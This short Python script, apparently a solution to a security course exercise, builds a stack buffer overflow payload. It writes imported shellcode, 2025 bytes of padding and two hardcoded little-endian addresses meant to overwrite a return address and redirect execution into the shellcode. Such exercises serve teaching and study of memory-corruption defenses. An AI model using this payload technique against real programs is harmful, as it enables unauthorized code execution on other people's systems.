#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(shellcode + b"0"*2025)
sys.stdout.buffer.write(pack("<I", 0xfffeae44))
sys.stdout.buffer.write(pack("<I", 0xfffeb650))
